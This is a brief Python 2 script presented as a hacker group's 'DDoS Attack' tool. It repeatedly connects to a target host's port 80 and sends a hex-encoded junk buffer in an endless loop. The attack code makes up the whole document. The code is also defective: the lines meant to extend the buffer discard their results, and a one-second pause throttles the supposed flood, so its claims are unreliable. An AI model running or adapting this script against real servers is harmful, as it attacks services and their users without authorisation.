import sys, socket, time
def fuckPacket_Main(host):
	print "-=]T34CH3R HackTeam DDoS Attack Python Script[=-"
	print "            -=]We Are Legion.[=-"
	buff = "\x21\x4D\x5A\x5F\x44\x44\x4F\x53\x20\x3D\x20\x57\x55\x23\x59\x48\x46\x4A\x53\x4A\x44\x49\x4C"
	buff + "\x4B\x4D\x4C\x4E\x4A\x43\x55\x23\x23\x55\x49\x46\x4F\x4C\x53\x44\x4A\x21\x57\x40\x40\x40\x40"
	buff + "\x40\x40\x40\x44\x42\x48\x45\x42\x46\x4B\x48\x20\x4A\x5A\x43\x3C\x4E\x42\x45\x47\x4A\x66\x76"
	buff + "\x62\x6A\x6A\x77\x65\x20\x48\x54\x54\x50\x20\x2F\x34\x30\x34\x20\x48\x54\x54\x50\x20\x31\x20"
	while True:	
		try:
			sock = socket.socket()
			sock.connect((host, 80))
		except:
			print "[-]Fail Connect :("
			sys.exit(1)
		
		print "[+]Sending super packet... "
		sock.send(buff)
		sock.close()
		time.sleep(1)
def fuckPacket_Param():
	try:
		host = sys.argv[1]
	except:
		print "-=] Usage: "+sys.argv[0]+" <target host> [=-"
		sys.exit(1)
	
	fuckPacket_Main(host)
fuckPacket_Param()
